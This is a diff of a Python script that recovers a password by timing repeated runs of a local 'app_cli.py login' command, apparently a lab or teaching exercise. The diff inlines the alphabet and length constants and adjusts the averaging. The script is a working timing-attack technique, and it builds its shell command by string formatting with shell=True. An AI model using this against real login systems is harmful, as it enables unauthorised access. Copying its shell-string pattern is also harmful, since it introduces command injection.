@@ -1,23 +1,29 @@
 import time
 import subprocess
 
-from app_cli import PASSWORD_ALPHABET, PASSWORD_LENGTH
+
+PASSWORD_ALPHABET = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+PASSWORD_LENGTH = 8
+COMMAND = "python3 app_cli.py login"
+
+AVERAGE_OF = 1
 
 
 def time_for_password(password):
+    """ Measures the runtime of app_cli.py """
+
     # Build command so it does not affect out measurement
     command = "python3 app_cli.py login {password}".format(password=password)
     
-    # Start measurement 
     start = time.time()
-    # Run programm
     p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    # Finish Measurement
-    return time.time() - start
+    runtime = time.time() - start
+
+    return runtime
 
 
-def avg_time_for_password(password, tries=10):
-    
+def avg_time_for_password(password, tries=AVERAGE_OF):
+    """ Measures average runtime of app_cli.py """
     # Get multiple runtimes
     durations = [time_for_password(password) for n in range(tries)]
     
@@ -62,7 +68,7 @@ def main():
             guess[first_unkown_index] = best[0]
             first_unkown_index += 1
         
-        guess[len(guess) - 1] = "X"
+        del guess[len(guess) - 1]
         print("Final guess: {final_guess}".format(final_guess="".join(guess)))
     else:
         # Timing attack on specified index
